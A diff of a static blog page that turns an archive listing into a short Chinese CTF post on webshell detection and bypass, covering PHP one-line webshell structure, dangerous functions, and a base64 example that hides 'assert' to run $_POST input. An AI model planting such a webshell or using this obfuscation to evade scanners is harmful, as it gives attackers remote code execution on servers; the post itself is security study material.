@@ -5,14 +5,20 @@
   
 
   
-  <title>Archives: 2023/1 | Lunatic&#39;s Workstation</title>
+  <title>Webshell Bypass | Lunatic&#39;s Workstation</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Lunatic&#39;s Workstation">
-<meta property="og:url" content="https://goodlunatic.github.io/archives/2023/01/index.html">
+  <meta name="description" content="Study and Reaserch of Webshell-Bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell Bypass">
+<meta property="og:url" content="https://goodlunatic.github.io/2023/09/01/Webshell%20Bypass/index.html">
 <meta property="og:site_name" content="Lunatic&#39;s Workstation">
+<meta property="og:description" content="Study and Reaserch of Webshell-Bypass">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-01T11:46:40.000Z">
+<meta property="article:modified_time" content="2023-09-01T16:13:22.689Z">
 <meta property="article:author" content="Lunatic">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternate" href="/atom.xml" title="Lunatic&#39;s Workstation" type="application/atom+xml">
@@ -66,78 +72,113 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main">
-  
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2023" class="archive-year">2023</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2023/01/20/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  <time datetime="2023-01-20T08:28:43.000Z" itemprop="datePublished">Jan 20</time>
+        <section id="main"><article id="post-Webshell Bypass" class="article article-type-post" itemscope
+  itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/09/01/Webshell%20Bypass/" class="article-date">
+  <time datetime="2023-09-01T11:46:40.000Z" itemprop="datePublished">2023-09-01</time>
 </a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+    <header class="article-header">
       
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/01/20/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">2022年终总结</a>
+    <h1 class="article-title" itemprop="name">
+      Webshell Bypass
     </h1>
   
 
     </header>
-  </div>
-</article>
-  
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  <time datetime="2023-01-08T09:48:23.000Z" itemprop="datePublished">Jan 8</time>
-</a>
+    <div class="article-entry" itemprop="articleBody">
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/01/08/CTF%E2%80%94%E2%80%94Pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">CTF——Pwn刷题记录</a>
-    </h1>
-  
-
-    </header>
+      <div class="toc-parent">
+  <div id="toc" class="toc-article">
+    <div class="toc-title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Webshell%E6%9F%A5%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="toc-text">Webshell查杀思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Webshell"><span class="toc-text">PHP-Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E5%8D%B1%E5%87%BD%E6%95%B0"><span class="toc-text">高危函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system"><span class="toc-text">system()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">编码绕过</span></a></li></ol></li></ol></li></ol>
   </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2023/01/03/Nepnep%20x%20CatCTF%20Writeup/" class="archive-article-date">
-  <time datetime="2023-01-03T04:37:41.000Z" itemprop="datePublished">Jan 3</time>
-</a>
+</div>
+      <p><strong>Study and Reaserch of Webshell-Bypass</strong></p>
+<span id="more"></span>
+
+<h1 id="Webshell查杀思路"><a href="#Webshell查杀思路" class="headerlink" title="Webshell查杀思路"></a>Webshell查杀思路</h1><ul>
+<li>分析统计内容</li>
+<li>语义分析(AST)</li>
+<li>机器学习(AI)</li>
+<li>动态监控(sandbox)</li>
+</ul>
+<h2 id="PHP-Webshell"><a href="#PHP-Webshell" class="headerlink" title="PHP-Webshell"></a>PHP-Webshell</h2><p>一句话木马的结构：php头+高危函数+可控参数(POST/GET传参)+php尾</p>
+<h3 id="高危函数"><a href="#高危函数" class="headerlink" title="高危函数"></a>高危函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h4><p>eval()不能通过拼接、混淆来执行，只能通过明文输入</p>
+<h4 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h4><p>在php7中，assert()也不再是函数了，变成了一个类似于eval的语言结构，不能再作为函数名动态执行代码</p>
+<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>在免杀中system()函数用的比较多</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p><strong>base64编码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;YX____Nz__ZX__J0&quot;</span>);  <span class="comment">//解密后为assert高危函数</span></span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_POST</span>[aabyss]);                      <span class="comment">//assert($_POST[aabyss]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
       
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/01/03/Nepnep%20x%20CatCTF%20Writeup/">Nepnep x CatCTF Writeup</a>
-    </h1>
-  
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://goodlunatic.github.io/2023/09/01/Webshell%20Bypass/" data-id="clm2zsp300037z03za1bncpx6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
 
-    </header>
+    </footer>
   </div>
-</article>
   
   
-    </div></section>
+<nav id="article-nav">
   
+    <a href="/2023/09/03/CTF%E2%80%94%E2%80%94Misc%E6%8C%87%E5%8D%97%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          CTF——Misc指南【长期更新】
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/09/01/Nodejs%20Basic%20and%20Vulnerability/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Nodejs Basic and Vulnerability</div>
+    </a>
+  
+</nav>
 
+  
+</article>
 
 </section>
         
